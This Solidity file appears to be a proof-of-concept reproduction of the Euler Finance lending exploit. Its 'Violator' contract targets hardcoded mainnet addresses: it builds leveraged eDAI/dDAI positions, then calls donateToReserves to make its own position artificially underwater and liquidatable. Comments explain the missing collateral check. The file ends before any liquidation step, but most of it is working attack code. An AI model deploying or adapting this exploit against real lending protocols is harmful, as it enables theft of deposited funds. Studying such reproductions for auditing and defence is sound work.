// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {IAaveV2} from "src/interfaces/Aave.sol";
import {IEuler} from "src/interfaces/Euler.sol";
import {IERC20} from "src/interfaces/ERC20.sol";
import {IEToken} from "src/interfaces/EToken.sol";
import {IDToken} from "src/interfaces/DToken.sol";

contract Violator {
    address constant EULER_PROTOCOL = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEToken eDAI = IEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    IDToken dDAI = IDToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);

    function violate() external {
        // Deposit 20M DAI into Euler
        DAI.approve(EULER_PROTOCOL, type(uint256).max);
        // Deposit 20M DAI into Euler
        eDAI.deposit(0, 20_000_000e18);
        // Borrow 200M eDAI, which will also mint 200M dDAI.
        // This is essentially bottowing 10x on the original collateral.
        eDAI.mint(0, 200_000_000e18);

        console.log("eDAI/dDAI balance at first 10x borrow: ", eDAI.balanceOf(address(this)), dDAI.balanceOf(address(this)));

        // Repay 10M dDAI, eliminating some of the debt and allowing us to do another 10x borrow.
        dDAI.repay(0, 10_000_000e18);
        // Repeat the 10x borrow again. While the leverage is excessive, the protocol is still healthy.
        // Feel free to remove line 31 to see what happens :).
        eDAI.mint(0, 200_000_000e18);

        console.log("eDAI/dDAI balance at second 10x borrow: ", eDAI.balanceOf(address(this)), dDAI.balanceOf(address(this)));

        // This is where the business logic fails. donateToReserves "donates" the eDAI to the reserve pool to avoid bad debt,
        // but this eDAI was obtained artificially by borrowing on leverage. The function does not check if the user is over-collaterized
        // after donating, and this means that donateToReserves can be used to cause an user to be artificially underwater.
        eDAI.donateToReserves(0, 100_000_000e18);

        // As you can see, eDAI < dDAI, which means that the user is underwater and the position is now liquidatable.
        console.log("eDAI/dDAI balance after donating to reserves: ", eDAI.balanceOf(address(this)), dDAI.balanceOf(address(this)));
    }
}
